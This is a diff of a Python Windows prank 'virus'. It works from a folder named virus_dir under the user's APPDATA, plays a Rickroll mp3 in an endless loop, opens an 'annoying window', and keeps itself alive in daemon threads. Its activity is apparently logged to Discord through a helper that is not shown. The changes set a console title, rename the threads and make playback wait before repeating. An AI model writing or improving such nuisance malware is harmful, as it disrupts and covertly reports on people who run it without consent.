@@ -1,5 +1,8 @@
 import os, requests, time, threading
 from multiprocessing import Process
+import ctypes
+ctypes.windll.kernel32.SetConsoleTitleW("TEST1")
+
 timestamp = time.time()
 home_dir = os.path.expanduser("~")
 appdata = os.environ['APPDATA']
@@ -44,20 +47,20 @@ def open_window(delay = 0):
 # def start():
 chnapik_duration = 2*60+10
 
-# Run the annoying window in a separate thread
-window_thread = threading.Thread(target=open_window, daemon=True)
-window_thread.start()
-
 def music_loop():
     log_to_discord("Starting music loop...")
     while True:
         log_to_discord("Playing music...")
-        os.system(f'start "" "{os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3")}"')
-        time.sleep(chnapik_duration)
+        os.system(f'start /wait "" "{os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3")}"')
+        # time.sleep(chnapik_duration)
         time.sleep(60) # 1 min delay
 
-music_process = threading.Thread(target=music_loop, daemon=True)
+music_process = threading.Thread(target=music_loop, daemon=True, name="GAMA1")
 music_process.start()
+
+# Run the annoying window in a separate thread
+window_thread = threading.Thread(target=open_window, daemon=True, name="GAMA2")
+window_thread.start()
 while True: time.sleep(3600) # Keep the main script alive for daemon threads
 
 
